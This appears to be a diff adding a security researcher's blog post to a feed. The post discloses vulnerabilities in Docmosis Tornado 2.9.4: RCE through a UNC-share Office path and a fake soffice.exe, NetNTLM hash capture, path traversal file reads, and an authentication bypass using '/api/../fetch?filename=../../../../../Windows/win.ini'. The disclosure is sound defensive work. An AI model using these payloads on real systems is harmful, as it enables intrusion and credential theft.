@@ -1,4 +1,199 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.0">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2022-12-02T12:37:59+01:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Frycos Security Diary</title><subtitle>Blogging mainly</subtitle><entry><title type="html">Pre-Auth RCE with CodeQL in Under 20 Minutes</title><link href="http://localhost:4000/vulns4free/2022/12/02/rce-in-20-minutes.html" rel="alternate" type="text/html" title="Pre-Auth RCE with CodeQL in Under 20 Minutes" /><published>2022-12-02T09:00:00+01:00</published><updated>2022-12-02T09:00:00+01:00</updated><id>http://localhost:4000/vulns4free/2022/12/02/rce-in-20-minutes</id><content type="html" xml:base="http://localhost:4000/vulns4free/2022/12/02/rce-in-20-minutes.html">&lt;p&gt;This write-up won’t be an intense discussion on security code review techniques this time.
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.0">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2023-01-25T19:41:06+01:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Frycos Security Diary</title><subtitle>Blogging mainly</subtitle><entry><title type="html">Using 0days to Protect the United Nations</title><link href="http://localhost:4000/vulns4free/2023/01/25/0days-united-nations.html" rel="alternate" type="text/html" title="Using 0days to Protect the United Nations" /><published>2023-01-25T00:00:00+01:00</published><updated>2023-01-25T00:00:00+01:00</updated><id>http://localhost:4000/vulns4free/2023/01/25/0days-united-nations</id><content type="html" xml:base="http://localhost:4000/vulns4free/2023/01/25/0days-united-nations.html">&lt;p&gt;Recently, I did a non-exhaustive security product review on a Document Generator Engine, named &lt;strong&gt;Docmosis&lt;/strong&gt;. A system I targeted used &lt;strong&gt;&lt;a href=&quot;https://www.docmosis.com/products/tornado/&quot;&gt;Docmosis Tornado&lt;/a&gt;&lt;/strong&gt; in its latest version &lt;strong&gt;2.9.4&lt;/strong&gt;. I’ll give you a walkthrough based on my local lab installation with a Proof-of-Concept exploitation on an on-premises system belonging to a specialized agency of the United Nations.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/docmosis/docmosisreport14.png&quot; alt=&quot;tornado&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;By default, no login is needed to access the web UI :-0. But as we’ll see, even if the password protection is enabled/configured, there is an &lt;strong&gt;Authentication Bypass&lt;/strong&gt; which makes all these findings exploitable from an &lt;strong&gt;unauthenticated context&lt;/strong&gt; as well. But let’s go through all the findings step by step.&lt;/p&gt;
+
+&lt;h2 id=&quot;remote-code-execution&quot;&gt;Remote Code Execution&lt;/h2&gt;
+
+&lt;p&gt;This first vulnerability relies on the fact that the web UI field &lt;strong&gt;“Open/Libre Office location”&lt;/strong&gt; can be changed, pointing to the &lt;em&gt;LibreOffice&lt;/em&gt; installation directory. All configuration changes are persisted after the corresponding &lt;em&gt;GWT-based&lt;/em&gt; HTTP POST request is sent to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/webserverdownload/configure&lt;/code&gt;. The corresponding URL mapping can be found in the web descriptor &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;web.xml&lt;/code&gt;.&lt;/p&gt;
+
+&lt;div class=&quot;language-xml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;servlet-mapping&amp;gt;&lt;/span&gt;
+  &lt;span class=&quot;nt&quot;&gt;&amp;lt;servlet-name&amp;gt;&lt;/span&gt;ConfigurationServlet&lt;span class=&quot;nt&quot;&gt;&amp;lt;/servlet-name&amp;gt;&lt;/span&gt;
+  &lt;span class=&quot;nt&quot;&gt;&amp;lt;url-pattern&amp;gt;&lt;/span&gt;/webserverdownload/configure&lt;span class=&quot;nt&quot;&gt;&amp;lt;/url-pattern&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;/servlet-mapping&amp;gt;&lt;/span&gt;
+...
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;servlet&amp;gt;&lt;/span&gt;
+  &lt;span class=&quot;nt&quot;&gt;&amp;lt;servlet-name&amp;gt;&lt;/span&gt;ConfigurationServlet&lt;span class=&quot;nt&quot;&gt;&amp;lt;/servlet-name&amp;gt;&lt;/span&gt;
+  &lt;span class=&quot;nt&quot;&gt;&amp;lt;servlet-class&amp;gt;&lt;/span&gt;com.docmosis.webserver.server.ConfigurationServiceImpl&lt;span class=&quot;nt&quot;&gt;&amp;lt;/servlet-class&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;/servlet&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;The responsible Java interface extends &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;com.google.gwt.user.server.rpc.RemoteServiceServlet&lt;/code&gt;, finally leading to the implementing class &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;com.docmosis.webserver.server.ConfigurationServiceImpl&lt;/code&gt;. The method &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;com.docmosis.webserver.server.ConfigurationServiceImpl.saveConfiguration(ConfigBean)&lt;/code&gt; is called then with the parameters given in the request. There exists a validation method &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;com.docmosis.webserver.server.ConfigurationServiceImpl.serverSideValidate(ConfigBean)&lt;/code&gt; which checks access to the Office location directory.&lt;/p&gt;
+
+&lt;div class=&quot;language-java highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;expectedFolders&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;DMProperties&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getStringArray&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;docmosis.openoffice.location.binary.searchpath&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;;&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;kt&quot;&gt;boolean&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;subFolderFound&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;expected&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;expectedFolders&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+  &lt;span class=&quot;nc&quot;&gt;File&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;subFolder&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;File&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;officePathFile&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;expected&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
+  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;subFolder&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;canRead&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;subFolder&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;isDirectory&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;())&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;subFolderFound&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
+    
+    &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
+  &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; 
+&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;expectedFolders&lt;/code&gt; member seems to be used to check for expected folders matching a valid Office installation. The same is done for the Template directories etc. No further validations with respect to security are done. On a standard Windows installation, an &lt;strong&gt;UNC network share path&lt;/strong&gt; could be used to point the Office directory to a remote host.
+The Office executable &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;soffice.exe&lt;/code&gt; is used for converter functions etc. and therefore is observable in the process tree of Docmosis Tornado after being started.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/docmosis/docmosisreport2.png&quot; alt=&quot;processtree&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Now, changing the &lt;strong&gt;Open/Libre Office location&lt;/strong&gt; value to a remote network share path allows to load an &lt;strong&gt;arbitrary malicious .exe file&lt;/strong&gt; named &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;soffice.exe&lt;/code&gt; instead. After a restart of Docmosis Tornado, this would be fetched and executed, allowing an attacker to executing arbitrary code on the targeted machine. This already is a critical vulnerability in itself but &lt;strong&gt;requires user interaction&lt;/strong&gt; on the server-side for the &lt;em&gt;restart&lt;/em&gt;. &lt;strong&gt;The web UI does not provide any restart functions&lt;/strong&gt;. Looking again at the GWT service implementation, we find the method &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;com.docmosis.webserver.server.ConfigurationServiceImpl.restartServer()&lt;/code&gt; which indeed allows exactly this via a properly crafted GWT HTTP request. This makes the &lt;strong&gt;user interaction restriction obsolete&lt;/strong&gt;. To following steps have to be taken to prove the Remote Code Execution (RCE).&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;We create a “malicious” &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;soffice.exe&lt;/code&gt; file with a C cross compiler with the following code underneath.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;void main()
+{
+	system(&quot;cmd.exe /C calc&quot;);
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;
+    &lt;p&gt;We mimick the directory/file structure of a valid LibreOffice installation on our remote attacker server.&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;We provide a fake SMB server with help of &lt;a href=&quot;https://github.com/fortra/impacket&quot;&gt;the impacket suite&lt;/a&gt;.&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;We change the Office location in the web UI pointing to this server &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;\\10.137.0.16\myshare\LibreOffice&lt;/code&gt;.&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/docmosis/docmosisreport15.png&quot; alt=&quot;changepath&quot; /&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;We observe NTLM authentication on our fake SMB server.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/docmosis/docmosisreport4.png&quot; alt=&quot;ntlmauth&quot; /&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;We trigger the restart of the Tornado service and got code execution, i.e. our malicious &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;soffice.exe&lt;/code&gt; got executed, popping a Windows calculator.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/docmosis/docmosisreport5.png&quot; alt=&quot;calc&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Since the targeted server uses NTLM authentication to login to the attacker’s fake SMB server, this could of course be used to capture the &lt;strong&gt;NetNTLM hash&lt;/strong&gt;. This hash could be cracked offline, so finally an attacker would have had valid Windows credentials to access the server via other channels.&lt;/p&gt;
+
+&lt;h2 id=&quot;multiple-path-traversals---file-read&quot;&gt;Multiple Path Traversals - File Read&lt;/h2&gt;
+
+&lt;p&gt;In general, no proper validation of file system operations with respect to traversal attacks can be found. This allows various attack vectors leading to file disclosure out of the context directories specified within the Tornado application.&lt;/p&gt;
+
+&lt;h3 id=&quot;restricted-file-read&quot;&gt;Restricted File Read&lt;/h3&gt;
+
+&lt;p&gt;First, we show a file read primitive with a few restrictions for the attacker. The &lt;strong&gt;“Source Templates From”&lt;/strong&gt; directory is set to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;C:\Users\user\Desktop\templates&lt;/code&gt; in our lab environment.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/docmosis/docmosisreport6.png&quot; alt=&quot;templatefolder&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Using the function &lt;em&gt;“Creating dummy data based on template”&lt;/em&gt; in the web UI fills the &lt;em&gt;Data&lt;/em&gt; text field automatically so afterwards we can click the &lt;em&gt;Test&lt;/em&gt; button to create e.g. a PDF file. Next to our &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;templates&lt;/code&gt; directory, mentioned above, we put a file with fake secret data &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;C:\Users\user\Desktop\secretfolder\secret.txt&lt;/code&gt;. Now the request is intercepted and a path traversal payload injected into the template reference path.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/docmosis/docmosisreport7.png&quot; alt=&quot;traversal1&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Indeed, the generated document contains the content of the secret file: a file located at a completely different folder than &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;C:\Users\user\Desktop\templates&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/docmosis/docmosisreport8.png&quot; alt=&quot;disclosure1&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;This seems at least be restricted to certain file types but nevertheless is a juicy vulnerability.&lt;/p&gt;
+
+&lt;h3 id=&quot;full-file-read&quot;&gt;Full File Read&lt;/h3&gt;
+
+&lt;p&gt;The most dangerous path traversal vulnerability originates from the service call to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/fetch?filename=[SOME_NAME].pdf&lt;/code&gt;. This is called after we generated the PDF file above to automatically download the file content from the server.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/docmosis/docmosisreport9.png&quot; alt=&quot;download&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;The corresponding implementation can be found in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;com.docmosis.webserver.servlet.FetchTmp.doGet(HttpServletRequest, HttpServletResponse)&lt;/code&gt;. The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;filename&lt;/code&gt; request parameter is used within a String concatenation to retrieve the file.&lt;/p&gt;
+
+&lt;div class=&quot;language-java highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;filename&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getParameter&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;filename&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;filename&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;System&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getProperty&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;java.io.tmpdir&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;/&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;filename&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;This allows an attacker to again introduce relative path segments, giving access to arbitrary files on the server file system. Here, we show reading the file &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;C:\Windows\win.ini&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/docmosis/docmosisreport10.png&quot; alt=&quot;traversal2&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;authentication-bypass&quot;&gt;Authentication Bypass&lt;/h2&gt;
+
+&lt;p&gt;Even though, the default installation does not require an &lt;em&gt;Admin password&lt;/em&gt; being set, the web UI indeed provides a configuration field. To test this, we set a password, clicked the logout button and indeed are redirected to the login page.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/docmosis/docmosisreport11.png&quot; alt=&quot;loginpage&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Also our full file read vulnerability now cannot be exploited anymore from an unauthenticated content (&lt;em&gt;still exploitable as authenticated user, though&lt;/em&gt;).&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/docmosis/docmosisreport12.png&quot; alt=&quot;traversalfail&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Looking at the web descriptor file &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;web.xml&lt;/code&gt; reveals that an authentication filter is set in place for all URI paths.&lt;/p&gt;
+
+&lt;div class=&quot;language-xml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;filter-mapping&amp;gt;&lt;/span&gt;
+	&lt;span class=&quot;nt&quot;&gt;&amp;lt;filter-name&amp;gt;&lt;/span&gt;AuthenticatedCheckFilter&lt;span class=&quot;nt&quot;&gt;&amp;lt;/filter-name&amp;gt;&lt;/span&gt;
+	&lt;span class=&quot;nt&quot;&gt;&amp;lt;url-pattern&amp;gt;&lt;/span&gt;/*&lt;span class=&quot;nt&quot;&gt;&amp;lt;/url-pattern&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;/filter-mapping&amp;gt;&lt;/span&gt; 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Every request has to go through the Java Servlet filter &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;com.docmosis.webserver.servlet.AuthenticatedCheckServlet.doFilter(ServletRequest, ServletResponse, FilterChain)&lt;/code&gt;.
+Surprisingly, the authentication check can be bypassed to reach the final &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;chain.doFilter(request, response)&lt;/code&gt; call. Responsible for this is the following code path:&lt;/p&gt;
+
+&lt;div class=&quot;language-java highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;authenticated&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// [1]&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;isRestCall&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// [2]&lt;/span&gt;
+
+
+
+    
+    &lt;span class=&quot;nc&quot;&gt;WebServerPreferences&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;prefs&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;WebServerPreferencesStore&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getPrefs&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
+    &lt;span class=&quot;kt&quot;&gt;boolean&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;authenticationRequired&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;StringUtilities&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;isEmpty&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;prefs&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getAdminPassword&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;());&lt;/span&gt;
+    
+    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;authenticationRequired&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// [3]&lt;/span&gt;
+      
+      &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;isGWTRPCCall&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+        
+        &lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;HttpServletResponse&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;response&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;sendError&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;401&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
+      &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; 
+      &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(!&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;authPostUrl&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;equals&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;req&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getRequestURI&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()))&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+        
+        &lt;span class=&quot;nc&quot;&gt;RequestDispatcher&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rd&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;req&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getRequestDispatcher&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/authenticate.jsp&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;rd&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;forward&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;response&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
+
+        
+        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
+      &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; 
+    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;At [1], it is properly checked if the user is already authenticated. If not, the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;if&lt;/code&gt; branch is entered. If this request is not part of a REST call [2] and an Admin password is set [3], then access is denied. The problem now relies in the check if &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;isRestCall&lt;/code&gt; is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;true/false&lt;/code&gt;.&lt;/p&gt;
+
+&lt;div class=&quot;language-java highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;boolean&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;isRestCall&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;req&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getRequestURI&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;startsWith&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/api/&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Our path traversal attack e.g. &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/fetch?filename=../../../../../Windows/win.ini&lt;/code&gt; indeed does not start with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/api&lt;/code&gt; but at this point of HTTP request processing, a simple bypass is possible due to using the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;startsWith&lt;/code&gt; String method.
+Using an URI path with relative path segments like &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/api/../fetch?filename=../../../../../Windows/win.ini&lt;/code&gt; bypasses the authentication check and triggers the file read primitive again.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/docmosis/docmosisreport13.png&quot; alt=&quot;bypass&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;internet-exposure-check&quot;&gt;Internet Exposure Check&lt;/h2&gt;
+
